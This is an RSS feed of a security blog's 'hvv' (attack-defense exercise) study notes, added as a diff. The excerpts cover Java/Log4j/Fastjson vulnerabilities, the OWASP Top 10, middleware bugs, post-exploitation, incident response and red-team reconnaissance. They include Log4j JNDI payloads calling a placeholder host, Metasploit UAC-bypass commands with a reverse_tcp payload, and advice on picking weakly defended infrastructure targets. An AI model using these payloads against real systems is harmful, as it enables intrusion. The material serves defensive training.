@@ -1,0 +1,155 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>hvv - Category - Sc0fie1d-Blog</title>
+        <link>http://scofield1920.github.io/categories/hvv/</link>
+        <description>hvv - Category - Sc0fie1d-Blog</description>
+        <generator>Hugo -- gohugo.io</generator><language>en</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><atom:link href="http://scofield1920.github.io/categories/hvv/" rel="self" type="application/rss+xml" /><item>
+    <title>hvv_Java</title>
+    <link>http://scofield1920.github.io/hvv_java/</link>
+    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
+        <name>scofied_lee</name>
+    </author><guid>http://scofield1920.github.io/hvv_java/</guid>
+    <description><![CDATA[java0.1 代码审计漏洞java代码审计 - 先知社区 (aliyun.com)
+0.2 java实现RCE的函数Runtime.getRuntime.exec(&ldquo;cmd&rdquo;)
+new ProcessBuilder().start(&ldquo;cmd&rdquo;)
+0.3 Log4J漏洞有深入了解吗？再正常的log处理过程中会对${内部字符进行检查,如果以但匹配到类似于表达式结构的字符串就会触发替换机制,将表达式的内容替换成为表达式解析后的内容,而不是表达式本身,从而导致攻击者构造符合要求的表达式供系统执行,漏洞成因,
+**特征:**在打印日志的时候,如果日志内容包含关键字${,那么攻击者就能把关键字包含的内容当作变量来替换成任何的攻击命令
+1 2 3 4 ${jndi:ldap://xxx.xxx.xxx.xxx/exp} 第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址 第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令 1 ${jndi:ldap://${sys:java.version}.collaborator.com} 0.3.1 ladp注入原理1.使用了lookup 2.lookup的参数动态可控 3.构建一个ldap服务，指定远程加载地址为恶意代码地址 4.在客户端访问ldap服务不存在的对象 5.客户端下载恶意代码到本地并执行
+0.3.2 rmi具体过程远端方法调用（Remote Method Invocation）
+Server端监听一个端口，这个端口是JVM随机选择的； Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作； Client端可以调用Stub上的方法； Stub连接到Server端监听的通信端口并提交参数； 远程Server端上执行具体的方法，并返回结果给Stub； Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样； 0.4 讲一下fastjsonFastjson提供了autotype功能再处理json的时候,允许用户在反序列化数据中通过“@type”指定反序列化的Class类型，没有对指定恶意代码Class的@Type， 服务端调用JSON.parseObject()时触发了该Class中的构造函数、或者是getter、setter方法中的恶意代码 ,远程连接rmi主机，反弹shell之类的操作
+1 2 3 4 5 6 7 8 9 10 11 { { &#34;x&#34;:{ &#34;@type&#34;: &#34;org.]]></description>
+</item><item>
+    <title>hvv_OWASP_TOP10</title>
+    <link>http://scofield1920.github.io/hvv_owasptop10/</link>
+    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
+        <name>scofied_lee</name>
+    </author><guid>http://scofield1920.github.io/hvv_owasptop10/</guid>
+    <description><![CDATA[TOP10漏洞 1 2 3 4 5 6 7 8 9 10 1、SQL注入 2、失效的身份认证和会话管理 3、跨站脚本攻击XSS 4、直接引用不安全的对象 5、安全配置错误 6、敏感信息泄露 7、缺少功能级的访问控制 8、跨站请求伪造CSRF 9、使用含有已知漏洞的组件 10、未验证的重定向和转发 常见web漏洞0.1 01-SQL注入漏洞0.1.1 1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。
+0.1.2 2.分类0.1.2.1 (1)注入点的不同分类●数字类型的注入 ●字符串类型的注入
+0.1.2.2 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入
+0.1.2.3 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。
+●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。
+●基于报错的注入
+●二次注入
+●宽字节注入
+有些waf会在我们的提交数据前会被加入\，\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义
+●盲注和延时注入的共同点？ 都是一个字符一个字符的判断
+0.1.3 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果
+0.1.4 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 0.]]></description>
+</item><item>
+    <title>hvv_中间件漏洞</title>
+    <link>http://scofield1920.github.io/hvv_middleware_bug/</link>
+    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
+        <name>scofied_lee</name>
+    </author><guid>http://scofield1920.github.io/hvv_middleware_bug/</guid>
+    <description><![CDATA[1 中间件：中间件（Middleware）又称为web服务器或web容器，是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。
+常见的web中间件：
+IIS Apache Tomcat Nginx Jboss Weblogic WebSphere 2 常见中间件漏洞：2.1 0x1 IISIIS（Internet Information Services），即互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。
+2.1.1 1、PUT漏洞IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。 版本： IIS6.0
+**修复方法：**关闭WebDAV 和写权限
+2.1.2 2、短文件名猜解IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。
+修复方法： 1）升级.net framework
+2）修改注册表禁用短文件名功能 快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径： HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效
+3）CMD关闭NTFS 8.3文件格式的支持
+4）将web文件夹的内容拷贝到另一个位置，如c:\www到d:\w,然后删除原文件夹，再重命名d:\w到c:\www。
+2.1.3 3、远程代码执行在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。
+修复方法：
+1）关闭 WebDAV 服务
+2） 使用相关防护设备
+2.1.4 4、解析漏洞IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。
+1 /test.asp/test.jpgtest.asp;.jpg 第一种是新建一个名为 “test.asp” 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行（特殊符号是 “/” ） 第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.]]></description>
+</item><item>
+    <title>hvv_后渗透</title>
+    <link>http://scofield1920.github.io/hvv_post_penetration/</link>
+    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
+        <name>scofied_lee</name>
+    </author><guid>http://scofield1920.github.io/hvv_post_penetration/</guid>
+    <description><![CDATA[1 权限提升通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。
+1.1 windows提权Windows常见权限分类：
+1 2 3 * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.1.1 1.提权辅助脚本 1 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 1.1.2 2.msf提权1.1.2.1 2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限
+（权限为Administrator时大概率会成功，其他可能需要绕UAC）
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 1.]]></description>
+</item><item>
+    <title>hvv_应急响应</title>
+    <link>http://scofield1920.github.io/hvv_emergency_response/</link>
+    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
+        <name>scofied_lee</name>
+    </author><guid>http://scofield1920.github.io/hvv_emergency_response/</guid>
+    <description><![CDATA[常见的应急响应事件分类：
+**Web入侵：**网页挂马、主页篡改、Webshell **系统入侵：**病毒木马、勒索软件、远控后门 **网络攻击：**DDOS攻击、DNS劫持、ARP欺骗
+基本思路流程：
+**收集信息：**收集客户信息和中毒主机信息，包括样本 **判断类型：**判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS 等等 **抑制范围：**隔离使受害⾯不继续扩⼤ **深入分析：**日志分析、进程分析、启动项分析、样本分析方便后期溯源 **清理处置：**杀掉进程，删除文件，打补丁，删除异常系统服务，清除后门账号防止事件扩大，处理完毕后恢复生产 **产出报告：**整理并输出完整的安全事件报告
+入侵排查被入侵主机的排查流程：
+定位被入侵的主机并且立即对该主机进行断网隔离 确定攻击类型 确定被入侵的时间范围 定位恶意文件和入侵痕迹 溯源入侵来源 清理恶意文件/修复漏洞 事件复盘 1 Windows入侵排查1.1 检查系统账号安全查看服务器是否有弱口令，远程管理端口3389，22等端口是否对公网开放
+1 可以问服务器管理人员，或者自行扫描测试 查看服务器是否存在可疑账号
+1 Win+R-&gt;lusrmgr.msc 1.1.1 看隐藏账号、克隆账号 创建用户时，在用户名后面加上$，就会创建成隐藏账号。
+隐藏用户不能在 net user 和控制面板中看到，需要用其他的方式。
+1、lusrmgr.msc 2、注册表HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/Names/
+1 2 3 4 5 6 在cmd中输入：net user 看看有没有陌生用户 在cmd中输入：regedit 找到注册表分支 “HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/Names/”看看有没有克隆用户（可以看到系统中的所有用户，包括隐藏用户） 关于克隆账号，看账号注册表中的F值和其他账号的F值是否相同 使用D盾_web查杀工具，集成了对克隆账号检测的功能 结合日志，查看管理员登录时间、用户名是否存在异常
+1 2 Win+R-&gt;eventvwr.msc 导出Windows的安全日志，利用LogParser进行分析 同时也要注意查看administrators组中是否存在赋权异常的账号。比如正常情况下guest用户处于禁用状态、普通应用账户(weblogic、apache、mysql)不需要在administrators组中。如下图，执行命令net user guest查看guest账号的信息，如果guest账号被启用，且在管理员组成员中有guest用户，需要询问客户运维人员该guest账户启用的必要性以及加入管理组是否有必要，否则可认为攻击者将系统自带用户guest启用并提权至管理员组后作为后门账号使用。
+1.2 检查异常端口、进程检查端口连接情况，是否有远程连接、可疑连接
+1 2 netstat -ano tasklist | find &#34;PID&#34; 进程]]></description>
+</item><item>
+    <title>hvv_渗透实战项目</title>
+    <link>http://scofield1920.github.io/hvv_penetration_testing/</link>
+    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
+        <name>scofied_lee</name>
+    </author><guid>http://scofield1920.github.io/hvv_penetration_testing/</guid>
+    <description><![CDATA[【渗透实战系列】|44-记一次授权渗透实战（过程曲折，Java getshell）
+【渗透实战系列】|31-记一次对学校的渗透测试
+【渗透实战系列】26|一记某cms审计过程(步骤详细)
+渗透系列之打击彩票站
+【渗透实战系列】｜13-waf绕过拿下赌博网站
+一次攻防演练的实战分享
+实战 | 记一次攻防演练中的溯源经历
+记一次挖矿linux挖矿木马应急分析排查处置过程]]></description>
+</item><item>
+    <title>hvv_红队外围信息收集</title>
+    <link>http://scofield1920.github.io/hvv_redteam_information_collection/</link>
+    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
+        <name>scofied_lee</name>
+    </author><guid>http://scofield1920.github.io/hvv_redteam_information_collection/</guid>
+    <description><![CDATA[本文的性质为资料整理，相关来源在相关内容下方或文章末尾
+1 红队概述：1.1 信息收集方式：一般采取以下几种方式在搜索引擎（如：baidu、google）进行搜索：
+主站相关联的链接，主站链接下可能会放置跳转，如邮件、OA等相关系统。
+主站子域名进行搜索，通过二级或三级域名进行目标搜索相关域名。
+主目标相关title，主要为搜索一些没有设置域名只有相关IP的系统。
+主目标相关body，这种搜索方式误报率比较高，通过一些条件可筛选出相关联系统。
+C段探测，一般前几种搜索方式获取相关IP，然后探测可能存在的C段，可获取一些没有相关联信息的隐藏资产。
+端口探测，扫描是否存在其他的web服务，或可利用的、可爆破的、未授权的端口等。
+邮件账号收集，一般为发布在公网上招聘、联系方式等，然后可进行弱密码破解。
+1.2 主要进攻目标原则: 资产范围比较庞大。因为资产范围广，容易出现不被关注的系统，安全性可能存在疏忽，比较容易进行突破；
+受关注比较低的。由于受到关注度高的系统，如果受到攻击，影响会比较大，安全性会比一般的高。所以需要选择受关注比较低的系统做为突破口；
+没有与资金直接关系的系统。涉及资金交易的系统，安全性受到重视度最高，突破难度大，所以不选择；
+安全管理不够完善的单位。安全管理不够完善的单位做为突破口，容易发现弱口令或密码相同，人员安全意识不高，容易利用钓鱼手段做为突破口；
+1.3 三个阶段：第一阶段
+定位好主要攻击目标后，一起寻找主要突破口，当成功撕开一个突破口后进入第二阶段；
+第二阶段
+由于刚撕开突破口，不宜动作太大，所以由主要攻击手进行内网探测信息收集，以及留后门工作，寻找其他跳板机；另外两人进行次要目标的寻求突破，当主攻手成功获取其他跳板机后，或者次要目标找到突破口进入第三阶段；
+第三阶段
+全力挖掘内网，尽量得分，寻求拿下任务目标系统。
+攻击手段 主要是通过以下途径开展渗透攻击：一是通过SQL注入、文件上传漏洞等攻击方式，对目标系统开展攻击，获取系统权限；二是利用后台、用户弱口令漏洞，获取网络及信息系统关键信息；三是利用系统已知漏洞，直接获得系统服务器权限。
+当攻陷的服务器处于内网之中，将进一步深入进行内网漫游。
+由于不同目标防守方一般经过行业划分，所以防守实力强弱差距比较大。
+防守方最强的为金融行业，毕竟与金钱有着直接关系的，受到关注度也是最高，安全投入最高，就算突破也很难获取大量得分，所以大多数攻方都不以金融行业为主要攻击目标。
+其次防守比较强的行业为重要企业，由于企业对外网络服务的业务少，受众面不如政府、金融行业，再加上企业对安全管理比较重视，所以企业属于易守难攻类型。
+防守比较薄弱的几个行业如下：
+运输交通、政府公众服务类、能源矿产类、电力等这几类系统的特点：
+资产庞大，业务系统驳杂、全国各地都有甚至到县城，容易被找到突破口。
+没有统一的安全管理，由于庞大系统需要多个管理员一起维护，一旦有重大漏洞爆出往往会出现响应不及时的现象。例如：在互联网上传播最新漏洞信息，防守比较强的行业能在第一时间内修复漏洞或者找到临时应对的方法。而防守薄弱的可能，没有获取相关信息，或者在了解信息后，没有比较好的解决方法选择极端的防守方式关闭站点。
+安全边界防护不严格，由于系统庞大系统需要布满全国各地，地方可能也会开放自己的业务系统，一旦一个地方被入侵成功，就可连通全国各地的内网，以点破面全部沦陷的风险。
+排查攻击能力较弱。
+例如：在内网中发现攻击或木马后门，防守强的行业能在发现后门后，分析出攻击的入侵点，并能锁定哪些资产可能被入侵进行彻底排查。而防守比较弱的队伍可能无法发现后门，或者无法彻底清除后门，导致在管理以为彻底修复问题后，内网仍然被入侵。
+2 正题：2.1 0x01 信息收集踩点 a b c 自动对词进行拆分匹配 拆分标准 空格 “a b c “ 把a b c 当成一个整体去查 ” a*b” *通配符 里面是一个或者多个 以a开头 b结尾 “ab” -c 找到ab 不包含c a and b 包含a和b “ab”(c|d) ab中可能包含c或者d intitle: xx 找标题 intext: xx 找内容 info: xx 搜索到关于一个URL的更多信息的页面列表，这里的信息包括这个网页的cache，还有与这个网页相似的网页等等 inurl: *.]]></description>
+</item><item>
+    <title>hvv_蓝队溯源反制</title>
+    <link>http://scofield1920.github.io/hvv_traceabilitycountermeasures/</link>
+    <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate><author>
+        <name>Author</name>
+    </author><guid>http://scofield1920.github.io/hvv_traceabilitycountermeasures/</guid>
+    <description><![CDATA[1 攻击研判1.0.1 （1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 1.0.2 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 1.0.3 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder 1.0.4 （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。
+1.0.5 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 1.0.6 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp
+1.0.7 （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 1.0.8 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。
+1.0.9 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 1.0.10 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 1.0.11 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；&lt;img/src=1&gt;；%0a或者%0d绕过；拼凑绕过 1.]]></description>
+</item></channel>
+</rss>
